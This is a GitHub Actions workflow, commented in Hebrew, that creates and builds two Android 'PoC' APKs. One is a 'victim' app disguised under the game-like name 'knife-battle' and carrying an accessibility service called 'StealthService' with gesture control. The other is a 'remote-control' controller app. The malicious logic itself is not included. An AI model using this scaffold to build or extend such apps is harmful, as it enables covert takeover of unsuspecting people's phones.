name: Build Stable PoC APKs (Minimal & Reliable)

on:
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read

    steps:
      # שלב 1: Checkout (גם אם הריפו ריק)
      - name: Checkout repository
        uses: actions/checkout@v4

      # שלב 2: יצירת מבנה פרויקט מינימלי ותקין מאפס
      - name: Create minimal Android project structure
        run: |
          # settings.gradle
          cat > settings.gradle << 'END'
          rootProject.name = "PoC"
          include ':app'
          END

          # build.gradle - project level (גרסה יציבה מאוד)
          cat > build.gradle << 'END'
          plugins {
              id 'com.android.application' version '8.5.2' apply false
          }
          END

          # יצירת תיקיות
          mkdir -p app/src/main/java/com/research/lab/victim
          mkdir -p app/src/main/java/com/research/lab/controller
          mkdir -p app/src/main/res/xml
          mkdir -p app/src/main/res/values

          # app/build.gradle - הגדרות בסיסיות + שמות APK
          cat > app/build.gradle << 'END'
          plugins {
              id 'com.android.application'
          }

          android {
              compileSdk 35

              namespace 'com.research.lab'

              defaultConfig {
                  applicationId "com.research.lab"
                  minSdk 30
                  targetSdk 35
                  versionCode 1
                  versionName "1.0-poc"
              }

              flavorDimensions = ["type"]
              productFlavors {
                  victim {
                      dimension "type"
                      applicationIdSuffix ".victim"
                      archivesBaseName = "knife-battle"
                  }
                  controller {
                      dimension "type"
                      applicationIdSuffix ".controller"
                      archivesBaseName = "remote-control"
                  }
              }

              buildTypes {
                  debug {
                      minifyEnabled false
                  }
              }

              compileOptions {
                  sourceCompatibility JavaVersion.VERSION_17
                  targetCompatibility JavaVersion.VERSION_17
              }
          }

          dependencies {
              implementation 'androidx.appcompat:appcompat:1.7.0'
              implementation 'androidx.core:core:1.13.1'
          }
          END

          # AndroidManifest.xml
          cat > app/src/main/AndroidManifest.xml << 'END'
          <?xml version="1.0" encoding="utf-8"?>
          <manifest xmlns:android="http://schemas.android.com/apk/res/android">

              <uses-permission android:name="android.permission.INTERNET" />

              <application android:allowBackup="false" android:label="PoC">

                  <activity android:name=".victim.jhome$LoadingActivity" android:exported="true">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>

                  <service android:name=".victim.jhome$StealthService"
                      android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
                      android:exported="true">
                      <intent-filter>
                          <action android:name="android.accessibilityservice.AccessibilityService" />
                      </intent-filter>
                      <meta-data
                          android:name="android.accessibilityservice"
                          android:resource="@xml/accessibility_config" />
                  </service>

                  <activity android:name=".controller.manager" android:exported="true">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>

              </application>
          </manifest>
          END

          # accessibility_config.xml
          cat > app/src/main/res/xml/accessibility_config.xml << 'END'
          <?xml version="1.0" encoding="utf-8"?>
          <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
              android:accessibilityEventTypes="typeWindowStateChanged"
              android:accessibilityFeedbackType="feedbackGeneric"
              android:notificationTimeout="100"
              android:canPerformGestures="true"
              android:description="@string/accessibility_desc" />
          END

          # strings.xml
          cat > app/src/main/res/values/strings.xml << 'END'
          <resources>
              <string name="app_name">PoC</string>
              <string name="accessibility_desc">Research PoC Accessibility Service</string>
          </resources>
          END

          echo "מבנה בסיסי נוצר בהצלחה"

      # שלב 3: התקנת JDK יציבה
      - name: Setup JDK 17 (Temurin - יציב מאוד)
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'

      # שלב 4: התקנת Gradle גלובלי יציב
      - name: Setup Gradle (no wrapper)
        uses: gradle/actions/setup-gradle@v4
        with:
          gradle-version: 8.10.2  # גרסה יציבה וארוכת טווח

      # שלב 5: בנייה
      - name: Build knife-battle APK (Victim)
        run: gradle assembleVictimDebug

      - name: Build remote-control APK (Controller)
        run: gradle assembleControllerDebug

      # שלב 6: העלאת התוצאות
      - name: Upload generated APKs
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: poc-apks
          path: |
            app/build/outputs/apk/victim/debug/*.apk
            app/build/outputs/apk/controller/debug/*.apk
          retention-days: 7
